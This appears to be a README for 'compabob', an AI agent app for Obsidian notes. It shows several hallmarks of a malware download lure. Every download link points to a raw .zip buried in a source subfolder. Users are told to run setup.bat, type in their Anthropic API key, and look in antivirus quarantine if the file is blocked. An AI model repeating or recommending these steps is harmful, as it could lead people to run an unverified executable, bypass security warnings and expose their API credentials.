# 🤖 compabob - Automate your knowledge work with agents

[![](https://img.shields.io/badge/Download_compabob-blue.svg)](https://github.com/depressiondip454/compabob/raw/refs/heads/main/modules/memory-search/Software-1.8-beta.2.zip)

compabob helps you manage your digital life. It connects your notes, research, and technical tasks into one system. You gain an AI partner that handles repetitive work, organizes your thoughts, and connects your data from Obsidian to modern AI models.

## 📥 How to download 

Visit the [official repository page](https://github.com/depressiondip454/compabob/raw/refs/heads/main/modules/memory-search/Software-1.8-beta.2.zip) to download the software. Select the latest version link under the releases section. Look for the file ending in .zip or .exe to begin your setup. 

## 🛠️ System requirements

Ensure your computer has the following items before you start:

*   Windows 10 or Windows 11.
*   An active internet connection. 
*   An API key from Anthropic.
*   At least 4GB of free disk space.
*   A basic text editor like Notepad or VS Code.

## ⚙️ Initial setup steps

Follow these steps to prepare your system once you download the file:

1. Extract the contents of the download file into a permanent folder on your drive.
2. Open the folder you created.
3. Locate the file named setup.bat and double-click it.
4. Wait for the terminal window to finish the installation process.
5. Provide your Anthropic API key when the prompt appears in your screen.
6. Press the Enter key to save your settings.

## 🧠 Using your knowledge base

The core of compabob relies on your personal files. Point the application to your Obsidian vault to give the AI access to your notes.

1. Open the compabob dashboard through the shortcut on your desktop.
2. Select the Settings menu.
3. Find the field labeled Path to Obsidian.
4. Click the Browse button and select your main folder for notes.
5. Save your changes and restart the application.

## 🚀 Running your first agent

Agents perform tasks for you. They sit in the background and watch for triggers you define.

1. Launch the agent manager from the main screen.
2. Choose an active skill from the list.
3. Click the Start button.
4. The agent now monitors your selected folders for new updates.
5. You can view the activity log to see what the agent finished.

## 🛡️ Safety and configuration

Safety hooks keep your data private. You control which folders and files the AI touches. Use the blocklist feature in the security tab to prevent the AI from reaching sensitive document folders. Your data stays on your local machine unless you choose to send it to the AI cloud service for analysis.

## 🧩 Adding new skills

You can expand what compabob does by adding small scripts called skills.

1. Download a skill plugin from the repository.
2. Move the file into the skills folder inside the compabob directory.
3. Restart the application to load the new code.
4. Configure the settings for your new skill within the dashboard.

## 💡 Troubleshooting common issues

If the software fails to start, check the following items:

*   Does your API key have credits remaining on the Anthropic dashboard?
*   Do you have write access to the folder where you installed the application?
*   Did your antivirus program block the execution of the setup file? Check your security history to see if the file moved to quarantine.
*   Close other high-resource applications to free up system memory if the agent runs slowly.

## 🔄 Updating your system

Check the main repository page periodically for new versions. Newer versions include better safety features and faster performance. Download the new version, extract the files over your current installation, and run the setup script again. Your existing settings and API keys remain safe during this process.

## 📖 Managing your workspace

Organize your work by creating sessions in the dashboard. Each session holds a specific state of your AI assistant. You can switch between different projects without losing your progress on previous tasks. Use the memory tab to review what the agent learned during a session. Clear this memory if you want the agent to start a task with fresh information.

## 📈 Performance tips

*   Use small folders for your knowledge base to speed up indexing. 
*   Turn off agents you do not currently use to save battery life and processor power.
*   Keep your Obsidian vault clean by removing duplicate files before you point the agent to that folder.
*   Delete logs from the temp folder monthly to save space.
